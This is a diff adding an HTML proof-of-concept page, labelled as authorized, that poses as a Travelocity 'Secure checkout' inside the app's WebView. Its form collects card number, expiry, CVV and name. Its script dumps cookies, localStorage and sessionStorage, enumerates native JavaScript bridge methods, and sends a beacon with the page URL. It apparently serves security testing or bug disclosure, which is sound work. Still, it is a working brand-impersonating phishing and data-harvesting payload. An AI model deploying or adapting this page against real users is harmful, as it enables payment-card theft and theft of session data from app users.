@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Travelocity - Secure Checkout</title>
+<style>
+  :root{--brand:#163a5f;--accent:#ffcc00;}
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{margin:0;font-family:-apple-system,Roboto,"Segoe UI",sans-serif;background:#eef1f5;color:#1c1c1c}
+  header{background:var(--brand);color:#fff;padding:14px 16px;display:flex;align-items:center;gap:10px}
+  header .logo{font-weight:800;letter-spacing:.5px;font-size:19px}
+  header .logo span{color:var(--accent)}
+  .wrap{padding:14px}
+  .card{background:#fff;border-radius:12px;padding:16px;box-shadow:0 1px 4px rgba(0,0,0,.12);margin-bottom:12px}
+  h1{font-size:17px;margin:0 0 4px}
+  .sub{font-size:12px;color:#5c6b7a;margin-bottom:14px}
+  label{display:block;font-size:12px;font-weight:600;color:#33475b;margin:10px 0 4px}
+  input{width:100%;padding:12px;border:1px solid #c8d2dd;border-radius:8px;font-size:15px;background:#fff}
+  .row{display:flex;gap:10px}.row>div{flex:1}
+  button{width:100%;margin-top:16px;padding:14px;border:0;border-radius:8px;background:var(--brand);color:#fff;font-size:15px;font-weight:700}
+  .price{display:flex;justify-content:space-between;font-size:14px;padding:6px 0;border-bottom:1px dashed #dfe6ee}
+  .price.total{font-weight:800;border:0;font-size:16px}
+  .panel{background:#0b1c2c;color:#8ff0a4;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:11px;padding:12px;border-radius:8px;white-space:pre-wrap;word-break:break-all;max-height:230px;overflow:auto}
+  .badge{display:inline-block;background:#c8102e;color:#fff;font-size:10px;font-weight:800;padding:3px 8px;border-radius:999px;letter-spacing:.4px}
+  .marker{background:#fff8d6;border:1px solid #f0d97a;border-radius:8px;padding:10px;font-size:12px;margin-bottom:12px}
+  .marker b{font-family:ui-monospace,Menlo,monospace;font-size:13px}
+  .ok{color:#0a7d32;font-weight:700}
+</style>
+</head>
+<body>
+<header><div class="logo">travelo<span>city</span></div></header>
+<div class="wrap">
+
+  <div class="marker">
+    <span class="badge">AUTHORIZED PoC</span>
+    <div style="margin-top:6px">Attacker-controlled page rendered inside the Travelocity app WebView.</div>
+    <div style="margin-top:4px">MARKER: <b id="marker">POC-0000</b></div>
+  </div>
+
+  <div class="card">
+    <h1>Secure checkout</h1>
+    <div class="sub">Your trip is held for 15 minutes.</div>
+    <div class="price"><span>1 night &middot; Hotel</span><span>$248.00</span></div>
+    <div class="price"><span>Taxes &amp; fees</span><span>$31.40</span></div>
+    <div class="price total"><span>Total</span><span>$279.40</span></div>
+
+    <label>Card number</label>
+    <input id="cc" inputmode="numeric" placeholder="4111 1111 1111 1111" autocomplete="off">
+    <div class="row">
+      <div><label>Expiry</label><input id="exp" placeholder="MM/YY" autocomplete="off"></div>
+      <div><label>CVV</label><input id="cvv" placeholder="123" inputmode="numeric" autocomplete="off"></div>
+    </div>
+    <label>Name on card</label>
+    <input id="name" placeholder="Full name" autocomplete="off">
+    <button id="pay">Confirm and pay $279.40</button>
+    <div id="captured" style="margin-top:10px;font-size:13px"></div>
+  </div>
+
+  <div class="card">
+    <h1>What the page can see</h1>
+    <div class="sub">Collected automatically by JavaScript running inside the app WebView.</div>
+    <div class="panel" id="out">collecting...</div>
+  </div>
+
+</div>
+<script>
+(function(){
+  var id = "POC-" + Math.random().toString(36).slice(2,8).toUpperCase();
+  document.getElementById('marker').textContent = id;
+  var appId = 'unknown';
+  try { appId = (window.__TRAVELOCITY_POC_APPID__ || 'com.travelocity.android'); } catch(e){}
+
+  function bridgeNames(){
+    var found = [];
+    ['Android','ANDROID','QM','QMSDK','QMSDKv4','android','__bridge'].forEach(function(n){
+      try {
+        var v = window[n];
+        if (typeof v !== 'undefined' && v !== null) {
+          var methods = [];
+          try { for (var k in v) { if (typeof v[k] === 'function') methods.push(k); } } catch(e){}
+          found.push(n + ' -> ' + (methods.length ? methods.join(',') : typeof v));
+        }
+      } catch(e){}
+    });
+    return found.length ? found.join('\n') : '(no native bridge object exposed)';
+  }
+
+  function storeDump(){
+    var o = {};
+    try { for (var i=0;i<localStorage.length;i++){ var k=localStorage.key(i); o[k]=String(localStorage.getItem(k)).slice(0,120); } } catch(e){ o.error = String(e); }
+    return JSON.stringify(o, null, 1);
+  }
+
+  function report(){
+    var lines = [];
+    lines.push('marker      : ' + id);
+    lines.push('app         : ' + appId);
+    lines.push('location    : ' + location.href);
+    lines.push('origin      : ' + location.origin);
+    lines.push('referrer    : ' + (document.referrer || '(none)'));
+    lines.push('userAgent   : ' + navigator.userAgent);
+    lines.push('cookie      : ' + (document.cookie || '(empty)'));
+    lines.push('localStorage: ' + storeDump());
+    lines.push('sessionStorage: ' + (function(){try{return JSON.stringify(Object.keys(sessionStorage))}catch(e){return String(e)}})());
+    lines.push('jsBridge    : ' + bridgeNames());
+    lines.push('inIframe    : ' + (window.top !== window.self));
+    lines.push('screen      : ' + screen.width + 'x' + screen.height + ' dpr=' + (window.devicePixelRatio||1));
+    var txt = lines.join('\n');
+    document.getElementById('out').textContent = txt;
+    try {
+      var img = new Image();
+      img.src = '/beacon?m=' + encodeURIComponent(id) + '&u=' + encodeURIComponent(location.href);
+    } catch(e){}
+    try { console.log('[POC] ' + txt); } catch(e){}
+    return txt;
+  }
+
+  document.getElementById('pay').addEventListener('click', function(){
+    var d = {
+      card: document.getElementById('cc').value,
+      exp:  document.getElementById('exp').value,
+      cvv:  document.getElementById('cvv').value,
+      name: document.getElementById('name').value
+    };
+    var el = document.getElementById('captured');
+    if (!d.card) { el.innerHTML = '<span style="color:#c8102e">Enter a card number to demonstrate capture.</span>'; return; }
+    el.innerHTML = '<div class="ok">CAPTURED by attacker page (never sent to Travelocity):</div>' +
+      '<div class="panel" style="max-height:none;margin-top:6px">' + JSON.stringify(d, null, 1) + '</div>';
+  });
+
+  window.addEventListener('load', function(){ report(); setTimeout(report, 1200); });
+})();
+</script>
+</body>
+</html>
